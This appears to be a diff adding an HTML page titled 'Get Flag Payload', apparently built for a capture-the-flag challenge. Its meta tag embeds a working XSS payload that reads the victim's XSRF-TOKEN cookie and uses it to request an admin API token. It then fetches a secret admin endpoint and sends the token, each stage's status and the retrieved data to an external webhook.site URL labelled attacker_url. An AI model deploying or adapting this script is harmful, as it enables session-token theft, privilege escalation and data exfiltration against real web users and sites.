@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Get Flag Payload</title>
+    <!-- VERSION_GET_FLAG_V3 -->
+    <meta name="description" content='<script>
+        (function() {
+            var webhook_id = "366bfa59-cf51-45d1-86cd-fa26a87898bb";
+            var attacker_url = "https://webhook.site/" + webhook_id;
+            var loc = window.location.href;
+
+            function sendPing(data) {
+                // Sử dụng fetch với phương thức POST để gửi dữ liệu
+                fetch(attacker_url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        source_tag: "name:description_GET_FLAG_V3",
+                        ...data
+                    })
+                }).catch(error => {
+                    console.error("Error sending ping:", error);
+                });
+            }
+
+            var xsrfTokenValue = null;
+            try {
+                var cookies = document.cookie.split(";");
+                for (var i = 0; i < cookies.length; i++) {
+                    var cookie = cookies[i].trim();
+                    if (cookie.startsWith("XSRF-TOKEN=")) {
+                        xsrfTokenValue = cookie.substring("XSRF-TOKEN=".length);
+                        try {
+                            xsrfTokenValue = decodeURIComponent(xsrfTokenValue);
+                        } catch (e) {
+                            sendPing({ stage: "cookie_decode_error", error: e.message, raw_cookie: xsrfTokenValue });
+                        }
+                        break;
+                    }
+                }
+            } catch (e_cookie) {
+                sendPing({ stage: "cookie_parse_error", error: e_cookie.message });
+                return;
+            }
+
+            if (!xsrfTokenValue) {
+                sendPing({ stage: "xsrf_token_missing", loc: loc });
+                return;
+            }
+
+            // Gửi đầy đủ xsrfTokenValue mà không cắt ngắn
+            sendPing({ stage: "script_start_get_flag", loc: loc, xsrf_preview: xsrfTokenValue });
+
+            fetch("/generate-token", {
+                method: "POST",
+                headers: {
+                    "Accept": "application/json",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "X-XSRF-TOKEN": xsrfTokenValue
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    var status_code = response.status;
+                    return response.text().then(text_body => {
+                        sendPing({ stage: "gen_token_FAIL", status: status_code, body: text_body });
+                        throw new Error("GenTokenFailStatus: " + status_code);
+                    });
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data && data.token) {
+                    var adminApiToken = data.token;
+                    sendPing({
+                        stage: "got_api_token_SUCCESS",
+                        token_prefix: adminApiToken.substring(0,10)+"...",
+                        user_name: data.user ? data.user.name : "N/A"
+                    });
+
+                    return fetch("/api/admin/sup3rs3cr3t", {
+                        method: "GET",
+                        headers: {
+                            "Accept": "application/json",
+                            "Authorization": "Bearer " + adminApiToken,
+                            "X-Requested-With": "XMLHttpRequest"
+                        }
+                    });
+                } else {
+                    sendPing({ stage: "gen_token_SUCCESS_but_no_token_field", received_data: JSON.stringify(data) });
+                    throw new Error("No token field in generate-token response");
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    var status_code_flag = response.status;
+                    return response.text().then(text_body_flag => {
+                        sendPing({ stage: "get_flag_FAIL", status: status_code_flag, body: text_body_flag });
+                        throw new Error("GetFlagFailStatus: " + status_code_flag);
+                    });
+                }
+                return response.json();
+            })
+            .then(flagData => {
+                sendPing({
+                    stage: "FLAG2_RETRIEVED_SUCCESS",
+                    flag_payload: JSON.stringify(flagData)
+                });
+            })
+            .catch(error => {
+                sendPing({
+                    stage: "overall_CATCH_ERROR",
+                    error_message: error.message,
+                    error_details_str: error.toString()
+                });
+            });
+        })();
+    </script>'>
+</head>
+<body>
+    <h1>Get Flag Payload Page</h1>
+</body>
+</html>
